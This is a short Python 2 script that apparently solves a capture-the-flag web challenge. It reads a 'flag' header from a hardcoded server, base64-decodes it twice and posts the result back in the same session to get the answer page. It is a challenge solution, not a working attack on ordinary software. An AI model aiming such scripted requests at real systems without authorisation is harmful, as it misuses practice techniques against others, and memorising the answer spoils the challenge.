import requests
import base64
url='http://120.24.86.145:8002/web6/'
r=requests.session()
c=base64.b64decode(base64.b64decode(r.get(url).headers['flag']).split(':')[1])
print c
data={'margin':c}
a=r.post(url=url,data=data)
print a.content
